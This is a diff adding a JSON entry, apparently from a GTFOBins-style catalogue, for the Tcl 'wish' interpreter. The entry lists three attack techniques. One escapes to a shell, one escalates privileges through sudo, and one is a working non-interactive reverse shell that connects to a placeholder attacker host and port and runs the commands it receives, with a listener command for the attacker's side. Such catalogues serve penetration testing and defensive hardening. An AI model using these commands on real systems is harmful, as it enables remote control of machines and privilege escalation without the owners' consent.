@@ -1,0 +1,20 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run 'nc -lp [port]' on the attacker box to receive the shell.",
+        "code": "echo 'set s [socket [host] [port]];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+      }
+    ]
+  }
+}
